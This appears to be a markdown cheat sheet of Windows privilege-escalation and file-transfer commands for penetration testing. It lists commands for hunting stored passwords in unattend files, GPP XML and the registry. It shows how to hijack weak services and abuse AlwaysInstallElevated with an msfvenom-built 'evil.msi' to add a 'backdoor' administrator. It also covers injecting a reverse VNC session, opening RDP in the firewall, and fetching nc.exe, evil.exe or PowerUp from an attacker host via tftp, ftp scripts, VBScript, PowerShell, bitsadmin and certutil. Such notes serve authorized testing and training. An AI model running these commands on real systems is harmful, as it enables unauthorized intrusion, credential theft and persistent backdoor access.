---
layout: default
title: template
parent: security stuff
#has_children: true
nav_order: 2
---

1. TOC
{:toc}


## Information Gathering
```
# what system are we conntected to?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# what is the hostname and username?
hostname
echo %username%

# show all environment variables
set

# show specific variable
echo %PATH%

# list every user on the the box
net users

# display info about user
net user <username>

# list networking/routing details
ipconfig /all
route print
arp -A

# show active network connections
netstat -ano

# firewall status (if > WinXP SP2)
netsh firewall show state

# firewall details
netsh firewall show config
netsh advfirewall firewall show rule all

# list scheduled tasks
schtasks /query /fo LIST /v

# show processes linked to started services
tasklist /SVC

# list running services
net start

# driver details
driverquery

#--------
#--WMIC--
#--------
# system info
wmic COMPUTERSYSTEM get TotalPhysicalMemory,caption
wmic CPU Get /Format:List

# examine the patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn
# check to see if patch is installed/missing (Patch format: KBXXXXXXX)
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4100347" /C:"KB44"
```

### Automated scripts
```
# windows-exploit-suggest.py
# download: https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
# blog: https://blog.gdssecurity.com/labs/2014/7/11/introducing-windows-exploit-suggester.html
python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt

# windows-privesc-check
# download: https://github.com/pentestmonkey/windows-privesc-check

# wmic_info.bat
# download: http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
```

### Stored Credentials
```
# contain clear-text passwords or b64 encoded
C:\sysprep.inf
C:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

# if the box is linked to a domain:
# Look for Groups.xml in the SYSVOL GPO preferences which can be used to create local users on the domain.
# Any authenticated user can have read access to this file. 
# The passwords are encrypted with AES. But the static key is published on the msdn website.
# Ergo, it can be decrypted

# search for other policy preference files that have the optional "cPassword" attribute set:
- Services\Services.xml: Element-Specific Attributes
- ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
- Printers\Printers.xml: SharedPrinter Element
- Drives\Drives.xml: Element-Specific Attributes
- DataSources\DataSources.xml: Element-Specific Attributes

# searching the filesystem
# search for specific keywords:
dir /s *pass* == *cred* == *vnc* == *.config*

# search file types for keyword
findstr /si password *.xml *.ini *.txt

# searching for files
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini

# grep registry for keywords (i.e. password)
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# find writable files
dir /a-r-d /s /b
- /a search for attributes (r is readonly, d is direcotry, the minus(-) sign negates the attribute 
- /s recurse subdirs
- /b bare format. Path and filename only
```

#### Automated Tools
```
# metasploit modules
- /post/windows/gather/credentials/gpp
- /post/windows/gather/enum_unattend

# powersploit
# download: https://github.com/PowerShellMafia/PowerSploit
Get-GPPPassword
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```

### Trusted Service Paths
```
# list all unquoted service paths (minus the build-in windows services)
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
# if you find unquoted path, check permissions
# if you can write to the defined path, plant a backdoor with the same name and retart the service :)
icacls "C:\Program Files (x86)\Program Folder"

# similarly, there is a metasploit module
- exploit/windows/local/trusted_service_path
```

### Vulnerable Services
```
# search for services that contain a binary path property which can be altered
# if found, change the binpath in executing a command of your own
# note: WinXP is shipped with many vulnerable built-in services
# use `accesschk` from SysInternals to search for these vulnerable services
# info: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\

# then query the service using `sc`
sc qc <vulnerable service name>

# then change the binpath to execute your own commands (maybe restart the service)
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc stop <vuln-service>
sc start <vuln-service>
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
sc stop <vuln-service>
sc start <vuln-service>

# note , may require to use the `depend` attribute 
sc stop <vuln-service>
sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
sc start <vuln-service>

# and as usual, there is a metasploit module
- exploit/windows/local/service_permissions
```

### Other: AlwaysInstallElevated
```
# `AlwaysInstallElevated is a setting which allows non-privileged users
# to run MSI installer packaged with elevated (system) permissions
# check to see if these two registry values are set to "1"
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# if so, you're good to create your own malicious msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi

# then copy it to the victim and use `msiexec` to execute it
msiexec /quiet /qn /i C:\evil.msi

# and the metasploit module:
- exploit/windows/local/always_install_elevated
```

### Getting the GUI
```
# using meterpreter, inject vnc session:
run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false

# enable RDP
netsh firewall set service RemoteDesktop enable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t 
REG_DWORD /d 0 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
sc config TermService start= auto
net start Termservice
netsh.exe
firewall
add portopening TCP 3389 "Remote Desktop"


# or this method
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=tcp

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=udp

# or, using meterpreter
# read more: https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
run post/windows/manage/enable_rdp
```

## File Transfers
### TFTP
```
# winxp and win2003 contain tftp client. Win7 does not by default.
# tftp clients are typically non-interactive
atftpd --daemon --port 69 /tftp
Windows> tftp -i 192.168.1.30 GET nc.exe
```

### FTP
```
# ftp commands can be put into a script and then executed with `ftp -s <script>`
echo open 192.168.30.5 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### VBScript
```
# wget.vbs script echo trick, copy and paste the commands in the shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# now execute the script and get your file
cscript wget.vbs http://10.11.0.102/evil.exe test.txt
```

### Powershell
```
# build the script
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.102/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

# then execute the script
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Webdav on Kali
```
# reference: https://github.com/mar10/wsgidav
# install wsgidav and cheroot
pip install wsgidav cheroot

# start the wsgidav on a restricted folder
mkdir /tmp/webdav_folder
wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav_folder

# on the windows host, mount the folder using `net use`
net use * http://YOUR_IP_ADDRESS/
```

### BitsAdmin
```
bitsadmin /transfer n http://domain/file c:%homepath%file
```

### debug.exe
```
# compress the executable with `upx` or similar
upx -9 nc.exe

# then use exe2bat to convert the executable into a series of echo commands
wine exe2bat.exe nc.exe nc.txt
```

### certutil
```
certutil.exe -URL
# the above will fetch any file and download it here:
# C:\Users\subTee\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
```


---

## Resources and More
{: .no_toc }
### Links
{: .no_toc }
#### Reference
{: .no_toc }
[InfoSecAddicts](https://infosecaddicts.com/)

